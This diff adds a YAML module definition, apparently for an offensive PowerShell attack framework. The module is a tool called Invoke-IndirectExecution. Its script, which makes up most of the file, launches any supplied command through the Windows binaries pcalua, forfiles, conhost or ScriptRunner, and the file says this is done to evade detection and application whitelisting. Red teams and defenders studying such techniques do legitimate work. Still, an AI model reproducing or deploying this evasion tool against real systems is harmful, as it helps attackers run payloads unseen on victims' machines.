@@ -1,0 +1,89 @@
+name: Invoke-IndirectExecution
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Proxy command execution through various Living Off the Land Binaries
+  (LOLBins) to evade detection and application whitelisting. Supported
+  methods include pcalua.exe (Program Compatibility Assistant),
+  forfiles.exe, conhost.exe, and ScriptRunner.exe. Each of these
+  binaries can be used to indirectly launch processes, creating
+  unusual process ancestry chains that may bypass security controls.
+software: ''
+tactics: [TA0005]
+techniques: [T1202]
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: Method
+    description: The LOLBin method to use for indirect execution.
+    required: true
+    value: 'pcalua'
+    strict: true
+    suggested_values:
+      - pcalua
+      - forfiles
+      - conhost
+      - scriptrunner
+  - name: Command
+    description: >-
+      The command or executable path to run via the selected proxy method.
+    required: true
+    value: 'powershell.exe -nop -Command Write-Host Indirect_Exec'
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Invoke-IndirectExecution {
+      param(
+          [string]$Method,
+          [string]$Command
+      )
+
+      Write-Output "[*] Indirect command execution via: $Method"
+
+      try {
+          switch ($Method) {
+              "pcalua" {
+                  Write-Output "[*] Using pcalua.exe -a ..."
+                  $proc = Start-Process -FilePath "pcalua.exe" -ArgumentList "-a", $Command -NoNewWindow -PassThru -ErrorAction Stop
+              }
+              "forfiles" {
+                  Write-Output "[*] Using forfiles.exe /p /m /c ..."
+                  $forfilesCmd = "cmd /c $Command"
+                  $proc = Start-Process -FilePath "forfiles.exe" `
+                      -ArgumentList "/p", "c:\windows\system32", "/m", "notepad.exe", "/c", "`"$forfilesCmd`"" `
+                      -NoNewWindow -PassThru -ErrorAction Stop
+              }
+              "conhost" {
+                  Write-Output "[*] Using conhost.exe ..."
+                  $proc = Start-Process -FilePath "conhost.exe" -ArgumentList $Command -NoNewWindow -PassThru -ErrorAction Stop
+              }
+              "scriptrunner" {
+                  Write-Output "[*] Using ScriptRunner.exe -appvscript ..."
+                  $proc = Start-Process -FilePath "ScriptRunner.exe" `
+                      -ArgumentList "-appvscript", "`"$Command`"" `
+                      -NoNewWindow -PassThru -ErrorAction Stop
+              }
+              default {
+                  Write-Output "[-] Unknown method: $Method"
+                  return
+              }
+          }
+          Write-Output "[+] Indirect execution initiated via $Method (PID: $($proc.Id))."
+      } catch {
+          Write-Output "[-] Failed to execute via ${Method}: $($_.Exception.Message)"
+      }
+  }
+script_end: Invoke-IndirectExecution {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
